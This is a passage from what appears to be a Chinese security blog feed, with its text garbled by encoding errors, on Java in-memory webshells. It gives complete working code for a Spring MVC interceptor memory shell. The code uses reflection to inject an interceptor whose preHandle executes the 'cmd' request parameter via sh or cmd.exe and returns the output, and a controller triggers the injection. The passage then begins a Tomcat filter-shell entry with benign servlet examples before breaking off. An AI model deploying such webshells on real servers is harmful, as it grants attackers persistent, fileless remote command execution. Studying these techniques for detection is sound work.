ä¸ºæ˜¯åœ¨AbstractHandlerMappingç±»ä¸­ï¼Œç”¨addInterceptorå‘æ‹¦æˆªå™¨chainä¸­æ·»åŠ çš„ã€‚è¯¥ç±»æ˜¯æŠ½è±¡ç±»ï¼Œå¯ä»¥è·å–å…¶å®ç°ç±»RequestMappingHandlerMappingã€‚ä¸€æ ·çš„ï¼Œå‰é¢æäº†å››ç§æ–¹æ³•ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116152954118.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116152954118.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-åå°„è·å–adaptedInterceptors"><a href="#2-åå°„è·å–adaptedInterceptors" class="headerlink" title="2.åå°„è·å–adaptedInterceptors"></a>2.åå°„è·å–adaptedInterceptors</h3><p>è·å–adaptedInterceptorsï¼Œprivateå±æ€§ï¼Œä½¿ç”¨åå°„ã€‚å¹¶ä¸”ä¼ å…¥RequestMappingHandlerMappingåˆå§‹åŒ–</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116153445849.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116153445849.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    field = RequestMappingHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">List&lt;HandlerInterceptor&gt; adaptInterceptors = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    adaptInterceptors = (List&lt;HandlerInterceptor&gt;) field.get(mappingHandlerMapping);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-æ·»åŠ æ¶æ„Interceptors"><a href="#3-æ·»åŠ æ¶æ„Interceptors" class="headerlink" title="3.æ·»åŠ æ¶æ„Interceptors"></a>3.æ·»åŠ æ¶æ„Interceptors</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adaptInterceptors.add(<span class="keyword">new</span> <span class="title class_">InjectEvilInterceptor</span>(<span class="string">&quot;a&quot;</span>));</span><br></pre></td></tr></table></figure><p>æ¶æ„Interceptor:éœ€è¦å®ç°HandlerInterceptoræ¥å£ï¼Œé€šè¿‡é‡å†™preHandleè¿›è¡ŒRCE</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">                response.getWriter().close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HandlerInterceptor.<span class="built_in">super</span>.postHandle(request, response, handler, modelAndView);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HandlerInterceptor.<span class="built_in">super</span>.afterCompletion(request, response, handler, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æµ‹è¯•ï¼š-1"><a href="#æµ‹è¯•ï¼š-1" class="headerlink" title="æµ‹è¯•ï¼š"></a>æµ‹è¯•ï¼š</h3><p>è¿‡æ»¤å™¨å’Œcontrollerå¯ä»¥ç›´æ¥ä½¿ç”¨@RequestMappingæ³¨è§£è¿›è¡ŒURLæ˜ å°„ã€‚æ‹¦æˆªå™¨Interceptoréœ€è¦æ‰‹åŠ¨ç¼–å†™ä¸€ä¸ªConfigæ·»åŠ è¿›å»ï¼Œæˆ–è€…ç›´æ¥ä¿®æ”¹é…ç½®æ–‡ä»¶spingmvc.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mvc:interceptors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mvc:mapping</span> <span class="attr">path</span>=<span class="string">&quot;/**&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.example.InjectInterceptor&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:interceptors</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.springmvc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        List&lt;HandlerInterceptor&gt; adaptInterceptors = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            adaptInterceptors = (List&lt;HandlerInterceptor&gt;) field.get(mappingHandlerMapping);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">InjectInterceptor</span> <span class="variable">evilInterceptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InjectInterceptor</span>();</span><br><span class="line">        adaptInterceptors.add(evilInterceptor);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">                response.getWriter().close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HandlerInterceptor.<span class="built_in">super</span>.postHandle(request, response, handler, modelAndView);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HandlerInterceptor.<span class="built_in">super</span>.afterCompletion(request, response, handler, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ–°å»ºä¸€ä¸ªcontrollerè§¦å‘æ‹¦æˆªå™¨ï¼Œä½œä¸ºå…¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.springmvc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/InjectInterceptor&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilController</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">index</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(<span class="string">&quot;org.example.springmvc.InjectInterceptor&quot;</span>);</span><br><span class="line">            response.getWriter().println(<span class="string">&quot;Inject done!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116171335538.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116171335538.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116171353734.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116171353734.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å‚è€ƒï¼š<a href="https://ho1aas.blog.csdn.net/article/details/123943546">https://ho1aas.blog.csdn.net/article/details/123943546</a></p><p><a href="https://www.freebuf.com/articles/web/327633.html">https://www.freebuf.com/articles/web/327633.html</a></p><p><a href="https://landgrey.me/blog/12/">https://landgrey.me/blog/12/</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> å†…å­˜é©¬ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…å­˜é©¬ </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcatå†…å­˜é©¬â€”â€”Filter&amp;Servlet&amp;Listener&amp;valve</title>
      <link href="/2022/12/12/tomcat-nei-cun-ma-filter-servlet-listener-valve/"/>
      <url>/2022/12/12/tomcat-nei-cun-ma-filter-servlet-listener-valve/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcatå†…å­˜é©¬"><a href="#Tomcatå†…å­˜é©¬" class="headerlink" title="Tomcatå†…å­˜é©¬"></a>Tomcatå†…å­˜é©¬</h1><p>åŸºç¡€çŸ¥è¯†ï¼š<a href="https://www.freebuf.com/articles/web/274466.html">https://www.freebuf.com/articles/web/274466.html</a></p><p>å†…å­˜é©¬ä¸»è¦åˆ†ä¸ºä»¥ä¸‹å‡ ç±»ï¼š</p><ol><li>servlet-apiç±»</li></ol><ul><li>filterå‹</li><li>servletå‹</li></ul><ol start="2"><li>springç±»</li></ol><ul><li>æ‹¦æˆªå™¨</li><li>controllerå‹</li></ul><ol start="3"><li>Java Instrumentationç±»</li></ol><ul><li>agentå‹</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226192132015.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226192132015.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¯·æ±‚ä¼šç»è¿‡filteråˆ°è¾¾servletï¼ŒåŠ¨æ€åˆ›å»ºfliteræ”¾åœ¨æœ€å‰é¢ï¼Œå°±ä¼šå‘½ä»¤æ‰§è¡Œ</p><h2 id="åŠ¨æ€æ³¨å†Œfliter"><a href="#åŠ¨æ€æ³¨å†Œfliter" class="headerlink" title="åŠ¨æ€æ³¨å†Œfliter"></a>åŠ¨æ€æ³¨å†Œfliter</h2><p>å…·ä½“æ–°å»ºservletçš„è¿‡ç¨‹ï¼š<a href="https://blog.csdn.net/gaoqingliang521/article/details/108677301">https://blog.csdn.net/gaoqingliang521/article/details/108677301</a></p><p>æ–°å»ºä¸€ä¸ªservlet:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/servlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">servlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException&#123;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;hello servlet&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é…ç½®tomcatï¼šåº”ç”¨ç¨‹åºä¸Šä¸‹æ–‡è¡¨ç¤ºhttpè®¿é—®servletçš„åœ°å€ï¼Œè¿™é‡Œå°±æ˜¯localhost:8080&#x2F;servlet</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226195245120.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226195245120.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226200309488.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226200309488.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è‡ªå®šä¹‰çš„filter:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">filterDemo</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter åˆå§‹åŒ–åˆ›å»º&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ‰§è¡Œè¿‡æ»¤æ“ä½œ&quot;</span>);</span><br><span class="line">      </span><br><span class="line">       filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹web.xmlï¼ŒæŒ‡å®šurl-patternä¸º<code>/demo</code>ï¼Œä¹Ÿå°±æ˜¯è®¿é—®<a href="http://localhost:8080/servlet/demo%E6%97%B6%E8%A7%A6%E5%8F%91filter%EF%BC%8C%E4%B8%80%E7%9B%B4%E5%88%B7%E6%96%B0%E4%B8%80%E7%9B%B4%E8%A7%A6%E5%8F%91">http://localhost:8080/servlet/demoæ—¶è§¦å‘filterï¼Œä¸€ç›´åˆ·æ–°ä¸€ç›´è§¦å‘</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee 